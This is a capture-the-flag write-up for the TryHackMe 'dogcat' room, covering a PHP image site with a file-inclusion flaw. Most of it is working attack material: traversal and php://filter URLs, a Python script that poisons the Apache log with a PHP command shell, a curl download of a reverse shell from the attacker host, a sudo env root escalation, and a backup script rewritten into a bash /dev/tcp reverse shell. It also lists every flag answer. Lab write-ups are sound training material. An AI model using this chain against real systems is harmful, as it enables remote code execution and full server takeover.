# dogcat

I made a website where you can look at pictures of dogs and/or cats!

[dogcat](https://tryhackme.com/room/dogcat)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Local File Inclusion
- Directory Traversal
- Python Scripting (Log Poisoning)
- Log Poisoning
- Abusing SUID/GUID
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!

This machine may take a few minutes to fully start up.

`view-source:http://10.10.236.6/?view=dog)../../../../../etc/passwd&ext=`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

`view-source:http://10.10.236.6/?view=php://filter/read=convert.base64-encode/resource=./dog/../index`

```
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

`view-source:http://10.10.236.6/?view=dog../../../../../var/log/apache2/access.log&ext=`

1. What is flag 1?

`http://10.10.236.6/?view=php://filter/convert.base64-encode/resource=dog../../flag`

```
kali@kali:~/CTFs/tryhackme/dogcat$ echo -n 'PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=' | base64 -d
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

```py
import requests

ip = "10.10.236.6"
url = f"http://{ip}/"

header = { "User-Agent": "<?php system($_GET['cmd']); ?>" }

params = {
    "view": "dog../../../../../var/log/apache2/access.log",
    "ext": ""
}

r = requests.get(url, headers=header, params=params)

if r.status_code == 200:
  print("log poisoned!")
else:
  print("an error occurred, please try again")
```

```
kali@kali:~/CTFs/tryhackme/dogcat$ python3 log_poison.py
```

- `view-source:http://10.10.236.6/?view=dog../../../../../var/log/apache2/access.log&ext=&cmd=ls%20-la`
- `view-source:http://10.10.236.6/?view=dog../../../../../var/log/apache2/access.log&ext=&cmd=whoami`

2. What is flag 2?

`view-source:http://10.10.236.6/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=cat%20../flag2_QMW7JvaY2LvK.txt`

```
10.8.106.222 - - [04/Oct/2020:09:22:39 +0000] "GET /?view=dog..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log&ext= HTTP/1.1" 200 18968 "-" "THM{LF1_t0_RC3_aec3fb}
```

`THM{LF1_t0_RC3_aec3fb}`

`/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o php-reverse-shell.php 10.8.106.222/php-reverse-shell.php`

`http://10.10.236.6/php-reverse-shell.php`

```
kali@kali:~/CTFs/tryhackme/dogcat$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.236.6] 36512
Linux 87423e9d96a6 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 09:43:42 up 55 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ sudo -l
Matching Defaults entries for www-data on 87423e9d96a6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 87423e9d96a6:
    (root) NOPASSWD: /usr/bin/env
$
```

```
$ sudo env /bin/sh

whoami
root
cd /root
ls
flag3.txt
cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```

1. What is flag 3?

`THM{D1ff3r3nt_3nv1ronments_874112}`

2. What is flag 4?

- `echo "#!/bin/bash" > /opt/backups/backup.sh`
- `echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.106.222/8888 0>&1'" >> /opt/backups/backup.sh`

```
kali@kali:~/CTFs/tryhackme/dogcat$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.236.6] 49730
bash: cannot set terminal process group (4662): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# whoami
whoami
root
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
root@dogcat:~#
```

`THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
